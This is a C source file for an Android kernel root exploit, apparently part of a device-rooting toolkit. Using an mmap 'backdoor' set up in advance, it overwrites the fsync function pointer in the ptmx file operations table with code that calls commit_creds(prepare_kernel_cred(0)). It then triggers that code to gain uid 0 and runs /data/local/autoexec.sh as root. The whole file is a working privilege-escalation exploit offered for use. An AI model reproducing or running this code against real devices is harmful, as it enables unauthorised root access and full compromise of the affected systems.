#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "cred.h"
#include "ptmx.h"
#include "backdoor_mmap.h"

void
obtain_root_privilege(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static bool
run_obtain_root_privilege(void *user_data)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
run_exploit(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  int fd;
  bool ret;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
  *ptmx_fsync_address = obtain_root_privilege;

  ret = run_obtain_root_privilege(NULL);

  *ptmx_fsync_address = NULL;

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!setup_creds_functions()) {
    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  run_exploit();

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/data/local/autoexec.sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
